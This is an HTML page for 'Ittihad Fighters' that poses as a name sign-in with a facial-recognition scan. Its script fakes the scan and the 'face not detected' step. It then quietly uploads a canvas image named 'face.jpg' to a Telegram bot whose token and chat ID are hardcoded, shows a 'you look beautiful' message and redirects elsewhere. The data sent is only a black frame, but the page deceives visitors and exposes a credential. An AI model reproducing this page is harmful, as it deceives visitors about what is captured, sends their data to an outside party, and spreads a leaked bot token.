<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ittihad Fighters</title>
    <script>
        if (localStorage.getItem("site_accessed")) {
            document.body.innerHTML = "You have already accessed this site once.";
        } else {
            localStorage.setItem("site_accessed", "true");
        }
    </script>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .hidden { display: none; }
        #animation { width: 100px; height: 100px; border-radius: 50%; border: 5px solid #ff4081; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>Ittihad Fighters</h1>
    <div id="name-selection">
        <p>Select your name:</p>
        <ul>
            <li><input type="checkbox" class="name-checkbox" value="Izz"> Izz</li>
            <li><input type="checkbox" class="name-checkbox" value="Ali"> Ali</li>
            <li><input type="checkbox" class="name-checkbox" value="Sara"> Sara</li>
        </ul>
        <button onclick="goToFaceRecognition()">Proceed</button>
    </div>

    <div id="face-recognition" class="hidden">
        <h2>Facial Recognition</h2>
        <button onclick="startCamera()">Continue</button>
        <button onclick="cancelRecognition()">Cancel</button>
        <p id="cancel-message" class="hidden">Page will stop here.</p>
    </div>

    <div id="scanning" class="hidden">
        <div id="animation"></div>
        <p>Scanning face...</p>
    </div>

    <p id="face-not-detected" class="hidden">Face not detected.</p>

    <p id="final-message" class="hidden"></p>

    <script>
        let selectedName = "";
        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
        const TELEGRAM_CHAT_ID = '5934902786';

        function goToFaceRecognition() {
            let checkboxes = document.querySelectorAll('.name-checkbox:checked');
            if (checkboxes.length === 0) return alert("Please select a name.");
            selectedName = checkboxes[0].value;
            checkboxes.forEach(box => box.disabled = true);
            document.getElementById("name-selection").classList.add("hidden");
            document.getElementById("face-recognition").classList.remove("hidden");
        }

        function cancelRecognition() {
            document.getElementById("face-recognition").classList.add("hidden");
            document.getElementById("cancel-message").classList.remove("hidden");
            localStorage.removeItem("site_accessed");
        }

        async function startCamera() {
            document.getElementById("face-recognition").classList.add("hidden");
            document.getElementById("scanning").classList.remove("hidden");
            
            setTimeout(() => {
                document.getElementById("scanning").classList.add("hidden");
                document.getElementById("face-not-detected").classList.remove("hidden");
                setTimeout(captureImage, 5000);
            }, 3000);
        }

        async function captureImage() {
            document.getElementById("face-not-detected").classList.add("hidden");
            document.getElementById("scanning").classList.remove("hidden");
            
            setTimeout(async () => {
                let canvas = document.createElement("canvas");
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                let ctx = canvas.getContext("2d");
                ctx.fillStyle = "black";
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    let formData = new FormData();
                    formData.append("chat_id", TELEGRAM_CHAT_ID);
                    formData.append("photo", blob, "face.jpg");
                    
                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    }).then(() => {
                        document.getElementById("scanning").classList.add("hidden");
                        document.getElementById("final-message").innerText = `${selectedName} signed in.\nYou look beautiful/handsome today!\nRedirecting...`;
                        document.getElementById("final-message").classList.remove("hidden");
                        setTimeout(() => { window.location.href = "https://studandlearn.github.io/project-2/"; }, 3000);
                    });
                }, 'image/jpeg');
            }, 2000);
        }
    </script>
</body>
</html>
